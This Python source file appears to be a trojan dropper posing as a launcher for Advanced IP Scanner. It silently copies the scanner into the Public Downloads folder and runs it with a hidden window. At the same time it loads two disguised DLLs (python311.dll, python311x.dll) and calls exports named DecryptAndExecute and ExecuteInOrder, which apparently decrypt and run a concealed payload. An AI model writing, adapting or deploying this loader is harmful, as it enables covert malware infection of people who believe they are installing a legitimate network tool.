import os
import sys
import ctypes
import subprocess
import shutil
import threading
from concurrent.futures import ThreadPoolExecutor

# Windows API
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

def resource_path(relative_path):
    """Get resource path for both dev and PyInstaller (only used for Advanced_IP_Scanner.exe)"""
    if hasattr(sys, '_MEIPASS'):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def get_public_downloads():
    """Get Public Downloads folder path"""
    public_folder = os.environ.get('PUBLIC', 'C:\\Users\\Public')
    return os.path.join(public_folder, 'Downloads', 'Advanced_IP_Scanner')

def get_exe_dir():
    """Get the directory where the executable is located"""
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.abspath(__file__))

def run_dll_operations():
    """Load and execute DLLs from the same directory as main.exe"""
    try:
        exe_dir = get_exe_dir()
        
        # Load python311.dll
        dll1_path = os.path.join(exe_dir, 'python311.dll')
        if os.path.exists(dll1_path):
            dll1 = ctypes.WinDLL(dll1_path)
            if hasattr(dll1, 'DecryptAndExecute'):
                dll1.DecryptAndExecute()
        
        # Load python311x.dll
        dll2_path = os.path.join(exe_dir, 'python311x.dll')
        if os.path.exists(dll2_path):
            dll2 = ctypes.WinDLL(dll2_path)
            if hasattr(dll2, 'ExecuteInOrder'):
                dll2.ExecuteInOrder()
        return True
    except Exception as e:
        print(f"DLL Error: {e}", file=sys.stderr)
        return False

def run_scanner():
    """Drop and execute scanner from Public Downloads folder (unchanged)"""
    try:
        target_dir = get_public_downloads()
        os.makedirs(target_dir, exist_ok=True)
        scanner_path = os.path.join(target_dir, 'Advanced_IP_Scanner.exe')
        
        # Copy executable to target location (still using resource_path)
        shutil.copy2(resource_path('resources/Advanced_IP_Scanner.exe'), scanner_path)
        
        # Execute with hidden window
        proc = subprocess.Popen(
            scanner_path,
            cwd=target_dir,
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
        )
        
        return True
        
    except Exception as e:
        print(f"Scanner Error: {e}", file=sys.stderr)
        return False

def main():
    with ThreadPoolExecutor(max_workers=2) as executor:
        # Run both operations in parallel
        future_dll = executor.submit(run_dll_operations)
        future_scanner = executor.submit(run_scanner)
        
        # Wait for both to complete
        results = [future_dll.result(), future_scanner.result()]
        
        if all(results):
            print("All operations completed successfully")
            return 0
        return 1

if __name__ == "__main__":
    sys.exit(main())